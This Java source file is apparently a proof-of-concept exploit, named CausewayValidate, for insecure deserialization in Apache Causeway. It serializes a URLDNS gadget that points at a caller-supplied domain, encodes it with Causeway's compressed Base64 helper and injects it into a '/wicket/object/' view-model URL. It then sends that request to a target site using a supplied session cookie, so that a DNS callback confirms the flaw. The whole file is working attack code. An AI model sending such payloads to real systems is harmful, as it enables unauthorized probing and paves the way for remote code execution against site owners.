package org.n1es.poc;

import org.json.JSONObject;
import org.n1es.utils.CausewayBase64Utils;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.net.URI;
import java.net.URLDecoder;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;

public class CausewayValidate {

	private static final String logicalTypeName = "simple.HomePageViewModel";

	private static final String path = "/wicket/object/";

	private static final HttpClient client = HttpClient.newHttpClient();

	public static JSONObject request(JSONObject json) {
		try {
			String domain    = "https://" + json.getString("domain");
			String targetURL = json.getString("targetURL");
			Object object    = URLDNS.getObject(domain);

			if (targetURL.endsWith("/")) {
				targetURL = targetURL.substring(0, targetURL.length() - 1);
			}

			ByteArrayOutputStream bout = new ByteArrayOutputStream();
			ObjectOutputStream    out  = new ObjectOutputStream(bout);

			out.writeObject(object);

			byte[] load              = CausewayBase64Utils.asCompressedUrlBase64.apply(bout.toByteArray());
			String urlSafeIdentifier = URLDecoder.decode(new String(load), StandardCharsets.UTF_8);
			targetURL = targetURL + path + logicalTypeName + ":" + urlSafeIdentifier;

			HttpRequest request = HttpRequest.newBuilder(new URI(targetURL))
					.header("Cookie", json.getString("Cookie"))
					.GET().build();

			json.put("targetURL", targetURL);

			client.send(request, HttpResponse.BodyHandlers.ofString());

			return json;
		} catch (Exception e) {
			throw new RuntimeException(e);
		}
	}
}
